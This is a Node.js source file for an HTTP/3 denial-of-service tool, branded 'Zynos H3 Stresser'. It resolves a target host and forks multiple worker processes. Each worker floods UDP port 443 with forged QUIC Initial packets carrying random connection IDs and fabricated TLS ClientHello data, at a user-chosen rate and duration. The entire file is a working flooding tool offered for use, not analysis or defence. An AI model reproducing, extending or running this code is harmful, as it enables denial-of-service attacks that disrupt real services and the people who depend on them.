/**
 * H3-FLOOD - Pure HTTP/3 (QUIC/UDP) Flooder
 * 
 * HTTP/3 uses QUIC protocol over UDP port 443
 * This script sends raw QUIC Initial packets to flood the target
 * 
 * Features:
 * - Pure UDP-based QUIC packets
 * - Multi-threaded with cluster
 * - High packet rate
 * - QUIC Initial handshake flood
 * - Connection ID spoofing
 * - Full header spoofing from original script
 * 
 * Usage: node h3x.js <target> <time> <rate> <threads> <proxy.txt>
 */

const dgram = require('dgram');
const dns = require('dns');
const cluster = require('cluster');
const crypto = require('crypto');
const fs = require('fs');
const url = require('url');
const net = require('net');
const tls = require('tls');
const http2 = require('http2');

// Error handling
process.on('uncaughtException', () => { });
process.on('unhandledRejection', () => { });
process.setMaxListeners(0);
require('events').EventEmitter.defaultMaxListeners = 0;

const blue = '\x1b[34m';
const white = '\x1b[37m';
const reset = '\x1b[0m';

// Header arrays (dari original)
const accept_header = [
  '*/*',
  'image/*',
  'image/webp,image/apng',
  'text/html',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
];

const encoding_header = [
  '*',
  '*/*',
  'gzip',
  'gzip, deflate, br',
  'gzip, deflate',
  "gzip, deflate, br, zstd"
];

const cache_header = [
  'max-age=0',
  'no-cache',
  'no-store',
  'pre-check=0',
  'post-check=0',
  'must-revalidate',
  'proxy-revalidate',
  's-maxage=604800',
  'no-cache, private',
  'max-age=300, must-revalidate',
  'no-store, max-age=0, private, must-revalidate',
  'public, max-age=10, s-maxage=10',
  'no-cache, no-store,private, max-age=0, must-revalidate',
  'no-cache, no-store,private, s-maxage=604800, must-revalidate',
  'no-cache, no-store,private, max-age=604800, must-revalidate',
];

const refers = [
  "https://google.com",
  "https://check-host.net/",
  "https://www.facebook.com/",
  "https://www.youtube.com/",
  "https://www.fbi.com/",
  "https://discord.com",
  "https://www.cloudflare.com",
];

const uap = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/133.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Edge/133.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0",
];

const language_header = [
  "id-ID,id;q=0.9,en;q=0.8",
  "en-US,en;q=0.9,id;q=0.8",
  "en-GB,en;q=0.9",
  "ja-JP,ja;q=0.9,en;q=0.8",
  "zh-CN,zh;q=0.9,en;q=0.8"
];

const methods = [
  "GET",
  "POST"
];

const fetch_site = [
  "same-origin", 
  "same-site", 
  "cross-site", 
  "none"
];

const fetch_mode = [
  "navigate", 
  "same-origin", 
  "no-cors", 
  "cors"
];

const fetch_dest = [
  "document", 
  "sharedworker", 
  "subresource", 
  "unknown", 
  "worker"
];

const sec_ch_ua = [
  '"Google Chrome";v="133", "Chromium";v="133", "Not_A Brand";v="24"',
  '"Google Chrome";v="132", "Chromium";v="132", "Not_A Brand";v="24"',
  '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
  '"Microsoft Edge";v="133", "Chromium";v="133", "Not_A Brand";v="24"',
  '"Brave";v="133", "Chromium";v="133", "Not_A Brand";v="24"',
  '"Brave";v="149.0.0.0", "Chromium";v="149.0.0.0", "Not?A_Brand";v="24.0.0.0"',
  '"Brave";v="150.0.0.0", "Chromium";v="150.0.0.0", "Not?A_Brand";v="24.0.0.0"',
  '"Brave";v="148.0.0.0", "Chromium";v="148.0.0.0", "Not?A_Brand";v="24.0.0.0"',
  '"Google Chrome";v="130", "Chromium";v="130", "Not_A Brand";v="24"',
  '"Google Chrome";v="129", "Chromium";v="129", "Not_A Brand";v="24"',
  '"Opera";v="118", "Chromium";v="133", "Not_A Brand";v="24"'    
];

const sec_ch_ua_platform = [
  '"Windows"',
  '"macOS"',
  '"Linux"',
  '"Android"',
  '"iOS"'
];

const sec_ch_ua_mobile = [
  '?0',
  '?1',
  '?0'
];

// QUIC Version constants
const QUIC_VERSIONS = [
    0x00000001, // QUIC v1 (RFC 9000)
    0x6b3343cf, // QUIC v2 (RFC 9369)
    0xff000020, // Draft-32
    0xff00001d, // Draft-29
    0xff00001e, // Draft-30
    0xff00001f, // Draft-31
];

// Usage check
if (process.argv.length < 7) {
    console.log(`Usage: host time req thread proxy.txt`);
    process.exit();
}

// Parse arguments
const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6]
};

var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);
const targetHost = parsedTarget.hostname;
const targetPort = 443;

let resolvedIP = null;

// ========== UTILITY FUNCTIONS ==========
function readLines(filePath) {
    try {
        return fs.readFileSync(filePath, 'utf-8').toString().split(/\r?\n/).filter(line => line.trim() && !line.startsWith('#'));
    } catch (e) {
        return [];
    }
}

function randomElement(elements) {
    return elements[Math.floor(Math.random() * elements.length)];
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function randomBytes(length) {
    return crypto.randomBytes(length);
}

function randomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

// ========== QUIC PACKET GENERATION ==========
function generateQUICInitialPacket() {
    const version = QUIC_VERSIONS[randomInt(0, QUIC_VERSIONS.length - 1)];
    const dcid = randomBytes(randomInt(8, 20));
    const scid = randomBytes(randomInt(8, 20));
    const token = randomBytes(randomInt(0, 32));
    const packetNumber = randomInt(0, 0xFFFFFF);

    const parts = [];

    // First byte: Long header + Initial type + packet number length
    const firstByte = 0xC0 | (randomInt(0, 3));
    parts.push(Buffer.from([firstByte]));

    // Version
    const versionBuf = Buffer.alloc(4);
    versionBuf.writeUInt32BE(version, 0);
    parts.push(versionBuf);

    // DCID Length + DCID
    parts.push(Buffer.from([dcid.length]));
    parts.push(dcid);

    // SCID Length + SCID
    parts.push(Buffer.from([scid.length]));
    parts.push(scid);

    // Token Length + Token
    if (token.length < 64) {
        parts.push(Buffer.from([token.length]));
    } else {
        parts.push(Buffer.from([0x40 | (token.length >> 8), token.length & 0xFF]));
    }
    if (token.length > 0) {
        parts.push(token);
    }

    // Payload Length
    const payloadSize = randomInt(1200, 1400);
    parts.push(Buffer.from([0x40 | (payloadSize >> 8), payloadSize & 0xFF]));

    // Packet Number
    const pnLength = (firstByte & 0x03) + 1;
    const pnBuf = Buffer.alloc(pnLength);
    for (let i = 0; i < pnLength; i++) {
        pnBuf[pnLength - 1 - i] = (packetNumber >> (8 * i)) & 0xFF;
    }
    parts.push(pnBuf);

    // CRYPTO frame with ClientHello
    const cryptoFrame = generateCryptoFrame();
    parts.push(cryptoFrame);

    // Padding
    const currentSize = parts.reduce((sum, buf) => sum + buf.length, 0);
    if (currentSize < 1200) {
        parts.push(Buffer.alloc(1200 - currentSize, 0x00));
    }

    return Buffer.concat(parts);
}

function generateCryptoFrame() {
    const parts = [];

    // CRYPTO frame type (0x06)
    parts.push(Buffer.from([0x06]));

    // Offset
    parts.push(Buffer.from([0x00]));

    // ClientHello data
    const clientHello = generateClientHello();

    // Length
    if (clientHello.length < 64) {
        parts.push(Buffer.from([clientHello.length]));
    } else if (clientHello.length < 16384) {
        parts.push(Buffer.from([0x40 | (clientHello.length >> 8), clientHello.length & 0xFF]));
    }

    parts.push(clientHello);

    return Buffer.concat(parts);
}

function generateClientHello() {
    const parts = [];

    // Handshake type: ClientHello (0x01)
    parts.push(Buffer.from([0x01]));

    // Length placeholder
    const lengthPos = 1;
    parts.push(Buffer.alloc(3));

    // Client Version: TLS 1.2
    parts.push(Buffer.from([0x03, 0x03]));

    // Random (32 bytes)
    parts.push(randomBytes(32));

    // Session ID
    const sessionId = randomBytes(32);
    parts.push(Buffer.from([sessionId.length]));
    parts.push(sessionId);

    // Cipher Suites
    const cipherSuites = Buffer.from([
        0x00, 0x08,
        0x13, 0x01, // TLS_AES_128_GCM_SHA256
        0x13, 0x02, // TLS_AES_256_GCM_SHA384
        0x13, 0x03, // TLS_CHACHA20_POLY1305_SHA256
        0x13, 0x04, // TLS_AES_128_CCM_SHA256
    ]);
    parts.push(cipherSuites);

    // Compression Methods
    parts.push(Buffer.from([0x01, 0x00]));

    // Extensions
    const extensions = generateTLSExtensions();
    parts.push(Buffer.from([(extensions.length >> 8) & 0xFF, extensions.length & 0xFF]));
    parts.push(extensions);

    // Set length
    const result = Buffer.concat(parts);
    const length = result.length - 4;
    result[1] = (length >> 16) & 0xFF;
    result[2] = (length >> 8) & 0xFF;
    result[3] = length & 0xFF;

    return result;
}

function generateTLSExtensions() {
    const extensions = [];

    // SNI
    const hostBytes = Buffer.from(targetHost, 'utf-8');
    const sniExt = Buffer.concat([
        Buffer.from([0x00, 0x00, 0x00, (hostBytes.length + 5), ((hostBytes.length + 3) >> 8) & 0xFF, (hostBytes.length + 3) & 0xFF, 0x00, (hostBytes.length >> 8) & 0xFF, hostBytes.length & 0xFF]),
        hostBytes
    ]);
    extensions.push(sniExt);

    // Supported Versions (TLS 1.3)
    extensions.push(Buffer.from([0x00, 0x2b, 0x00, 0x03, 0x02, 0x03, 0x04]));

    // Supported Groups
    extensions.push(Buffer.from([0x00, 0x0a, 0x00, 0x08, 0x00, 0x06, 0x00, 0x1d, 0x00, 0x17, 0x00, 0x18]));

    // Signature Algorithms
    extensions.push(Buffer.from([0x00, 0x0d, 0x00, 0x0e, 0x00, 0x0c, 0x04, 0x03, 0x05, 0x03, 0x08, 0x04, 0x08, 0x05, 0x08, 0x06, 0x04, 0x01]));

    // Key Share (x25519)
    const keyShare = randomBytes(32);
    extensions.push(Buffer.from([0x00, 0x33, 0x00, 0x26, 0x00, 0x24, 0x00, 0x1d, 0x00, 0x20]));
    extensions.push(keyShare);

    // QUIC Transport Parameters
    const quicParams = generateQUICTransportParams();
    extensions.push(Buffer.from([0xff, 0xa5, (quicParams.length >> 8) & 0xFF, quicParams.length & 0xFF]));
    extensions.push(quicParams);

    // ALPN (h3)
    extensions.push(Buffer.from([0x00, 0x10, 0x00, 0x05, 0x00, 0x03, 0x02, 0x68, 0x33]));

    return Buffer.concat(extensions);
}

function generateQUICTransportParams() {
    const params = [];
    const scid = randomBytes(randomInt(8, 16));

    params.push(Buffer.from([0x04, 0x08]));
    params.push(randomBytes(8));

    params.push(Buffer.from([0x05, 0x08]));
    params.push(randomBytes(8));

    params.push(Buffer.from([0x08, 0x02, 0x40, randomInt(10, 100)]));

    params.push(Buffer.from([0x01, 0x02, 0x40, randomInt(30, 60)]));

    params.push(Buffer.from([0x0f, scid.length]));
    params.push(scid);

    return Buffer.concat(params);
}

// ========== DNS RESOLVE ==========
function resolveHost() {
    return new Promise((resolve, reject) => {
        dns.lookup(targetHost, { family: 4 }, (err, address) => {
            if (err) {
                reject(err);
            } else {
                resolve(address);
            }
        });
    });
}

// ========== UDP FLOODER ==========
function runUDPFlooder(targetIP) {
    const socket = dgram.createSocket('udp4');

    socket.on('error', () => {
        socket.close();
    });

    const floodInterval = setInterval(() => {
        for (let i = 0; i < args.Rate; i++) {
            try {
                const packet = generateQUICInitialPacket();
                socket.send(packet, 0, packet.length, targetPort, targetIP, () => {});
            } catch (e) {}
        }
    }, 1000);

    setTimeout(() => {
        clearInterval(floodInterval);
        socket.close();
    }, args.time * 1000);
}

// ========== MASTER ==========
if (cluster.isMaster) {
    console.clear();
    console.log(`\x1b[36m--------------------------------------------\x1b[0m`);
    console.log(`\x1b[33mUser: \x1b[32mPrv\x1b[0m \x1b[36m|\x1b[0m \x1b[33mVip: \x1b[32mtrue\x1b[0m \x1b[36m|\x1b[0m \x1b[33mSuperVip: \x1b[32mtrue\x1b[0m`);
    console.log(`\x1b[33mAdmin: \x1b[35mZYNOS\x1b[0m \x1b[36m|\x1b[0m \x1b[33mExpired: \x1b[31mNo\x1b[0m \x1b[36m|\x1b[0m \x1b[33mTime Limit: \x1b[32m${args.time}s\x1b[0m`);
    console.log(`\x1b[36m--------------------------------------------\x1b[0m`);
    console.log(`\x1b[33mTarget: \x1b[37m${args.target}\x1b[0m`);
    console.log(`\x1b[33mRate: \x1b[37m${args.Rate}/s\x1b[0m \x1b[36m|\x1b[0m \x1b[33mThreads: \x1b[37m${args.threads}\x1b[0m`);
    console.log(`\x1b[33mProxy: \x1b[37m${args.proxyFile} (\x1b[32m${proxies.length}\x1b[37m)\x1b[0m`);
    console.log(`\x1b[33mProtocol: \x1b[37mQUIC (UDP:443) + HTTP/3\x1b[0m`);
    console.log(`\x1b[36m--------------------------------------------\x1b[0m`);
    console.log(`\x1b[35mZynos H3 Stresser 2025-2026 | C2 | t.me/zynos_official\x1b[0m`);
    console.log(`\x1b[36m--------------------------------------------\x1b[0m`);

    resolveHost().then((ip) => {
        resolvedIP = ip;
        console.log(`\x1b[32m[*] Resolved ${targetHost} -> ${ip}\x1b[0m`);
        console.log(`\x1b[32m[*] Starting QUIC/HTTP/3 flood with ${args.threads} threads...\x1b[0m`);

        for (let i = 0; i < args.threads; i++) {
            cluster.fork({ TARGET_IP: ip });
        }

        cluster.on('exit', () => {
            cluster.fork({ TARGET_IP: ip });
        });

        setTimeout(() => {
            console.log('\x1b[31m[*] Attack completed. Exiting...\x1b[0m');
            process.exit(0);
        }, args.time * 1000);
    }).catch((err) => {
        console.error(`\x1b[31mDNS resolution failed: ${err.message}\x1b[0m`);
        process.exit(1);
    });

} else {
    // ========== WORKER ==========
    const targetIP = process.env.TARGET_IP;

    // Run pure UDP QUIC flood
    runUDPFlooder(targetIP);

    setTimeout(() => {
        process.exit(0);
    }, args.time * 1000);
}